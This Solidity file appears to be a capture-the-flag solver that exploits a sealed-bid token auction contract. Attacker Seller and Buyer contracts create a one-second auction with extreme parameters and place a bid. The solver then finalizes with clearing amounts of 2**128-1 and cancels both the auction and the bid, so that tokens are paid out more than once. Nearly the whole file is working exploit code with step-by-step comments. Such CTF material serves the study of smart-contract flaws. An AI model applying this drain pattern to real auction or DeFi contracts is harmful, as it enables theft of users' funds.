// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "forge-std/console.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {FixedPointMathLib} from "solmate/utils/FixedPointMathLib.sol";

import {Math} from "src/util/Math.sol";

contract Solve is CTFSolver {
    function solve(address challenge_, address) internal override {
        Challenge challenge = Challenge(challenge_);

        Solver solver = new Solver(challenge);

        challenge.quoteToken().transfer(address(solver), 100 ether);
        challenge.baseToken().transfer(address(solver), 100 ether);

        console.log("solved?", challenge.isSolved());
    }
}

contract Solver {
    AuctionManager auction;

    ERC20 quoteToken;
    ERC20 baseToken;

    Seller attacker_seller;
    Buyer attacker_buyer;

    constructor(Challenge _challenge_) {
        auction = _challenge_.auction();
        quoteToken = _challenge_.quoteToken();
        baseToken = _challenge_.baseToken();

        attacker_seller = new Seller(address(auction), quoteToken, baseToken);
        attacker_buyer = new Buyer(address(auction), quoteToken, baseToken);
    }

    function phase1() external {
        baseToken.transfer(address(attacker_seller), 100 ether);
        quoteToken.transfer(address(attacker_buyer), 100 ether);

        // Create auction
        uint256 auction_id = attacker_seller.createAuction(
            2 ** 32, // totalBaseAmount
            2 ** 120, // reserveQuotePerBase
            2 ** 20, // minimumBidQuote
            uint32(block.timestamp), // startTimestamp
            uint32(block.timestamp + 1), // endTimestamp
            uint32(block.timestamp + 1), // vestingStartTimestamp
            uint32(block.timestamp + 1), // vestingEndTimestamp
            0 // cliffPercent
        );

        // Bid on auction
        attacker_buyer.setAuctionId(auction_id);
        attacker_buyer.bidOnAuction(
            2 ** 30, // baseAmount
            2 ** 30 // quoteAmount
        );
    }

    function phase2() external {
        // Finalize with clearingQuote = clearingBase = 2**128-1
        // Will transfer unsold base amount + matched quote amount
        uint256[] memory bidIndices = new uint256[](1);
        bidIndices[0] = 0;

        // vm.warp(block.timestamp + 1);
        attacker_seller.finalize(bidIndices, 2 ** 128 - 1, 2 ** 128 - 1);

        // Cancel auction
        // Will transfer back sold base amount
        attacker_seller.cancelAuction();

        // Cancel bid
        // Will transfer back to buyer quoteAmount
        attacker_buyer.cancel();
    }
}

contract Seller {
    AuctionManager auctionContract;

    uint256 auctionId;
    Math.Point publicKey;

    ERC20 quoteToken;
    ERC20 baseToken;

    uint256 constant SELLER_PRIVATE_KEY = uint256(keccak256("Size Seller"));
    uint256 constant SELLER_STARTING_BASE = 100 ether;

    constructor(address _auction_contract, ERC20 _quoteToken, ERC20 _baseToken) {
        auctionContract = AuctionManager(_auction_contract);
        quoteToken = _quoteToken;
        baseToken = _baseToken;
        publicKey = Math.publicKey(SELLER_PRIVATE_KEY);
        baseToken.approve(address(auctionContract), type(uint256).max);
    }

    function createAuction(
        uint128 totalBaseTokens,
        uint256 reserveQuotePerBase,
        uint128 minimumBidQuote,
        uint32 startTimestamp,
        uint32 endTimestamp,
        uint32 unlockStartTimestamp,
        uint32 unlockEndTimestamp,
        uint128 cliffPercent
    ) public returns (uint256) {
        AuctionManager.Time memory timings = AuctionManager.Time(
            uint32(startTimestamp),
            uint32(endTimestamp),
            uint32(unlockStartTimestamp),
            uint32(unlockEndTimestamp),
            uint128(cliffPercent)
        );

        AuctionManager.AuctionParameters memory params = AuctionManager.AuctionParameters(
            address(baseToken),
            address(quoteToken),
            reserveQuotePerBase,
            totalBaseTokens,
            minimumBidQuote,
            bytes32(0),
            publicKey
        );

        auctionId = auctionContract.create(params, timings);
        return auctionId;
    }

    function finalize(uint256[] calldata bidIndices, uint128 clearingBase, uint128 clearingQuote) public {
        auctionContract.show(auctionId, SELLER_PRIVATE_KEY, abi.encode(bidIndices, clearingBase, clearingQuote));
    }

    function cancelAuction() public {
        auctionContract.auctionCancel(auctionId);
    }

    function balances() public view returns (uint256, uint256) {
        return (quoteToken.balanceOf(address(this)), baseToken.balanceOf(address(this)));
    }
}

contract Buyer {
    AuctionManager auctionContract;

    uint256 auctionId;
    uint256 lastBidIndex;
    uint128 baseAmount;
    bytes16 salt;

    Math.Point publicKey;

    ERC20 quoteToken;
    ERC20 baseToken;

    uint256 constant SELLER_PRIVATE_KEY = uint256(keccak256("Size Seller"));
    uint256 constant BUYER_PRIVATE_KEY = uint256(keccak256("Size Buyer"));

    constructor(address _auction_contract, ERC20 _quoteToken, ERC20 _baseToken) {
        auctionContract = AuctionManager(_auction_contract);

        quoteToken = _quoteToken;
        baseToken = _baseToken;
        publicKey = Math.publicKey(BUYER_PRIVATE_KEY);
        salt = bytes16(keccak256(abi.encode("randomsalt")));

        quoteToken.approve(address(auctionContract), type(uint256).max);
    }

    function setAuctionId(uint256 _aid) external {
        auctionId = _aid;
    }

    function bidOnAuction(uint128 _baseAmount, uint128 quoteAmount) public returns (uint256) {
        require(quoteToken.balanceOf(address(this)) >= quoteAmount);
        baseAmount = _baseAmount;
        bytes32 message = auctionContract.genMessage(baseAmount, salt);
        (, bytes32 encryptedMessage) = Math.encrypt(Math.publicKey(SELLER_PRIVATE_KEY), BUYER_PRIVATE_KEY, message);

        lastBidIndex = auctionContract.addBid(
            auctionId,
            quoteAmount,
            auctionContract.genCommitment(message),
            publicKey,
            encryptedMessage,
            new bytes32[](0)
        );
        return lastBidIndex;
    }

    function balances() public view returns (uint256, uint256) {
        return (quoteToken.balanceOf(address(this)), baseToken.balanceOf(address(this)));
    }

    function cancel() public {
        AuctionManager(auctionContract).bidCancel(auctionId, lastBidIndex - 1);
    }
}
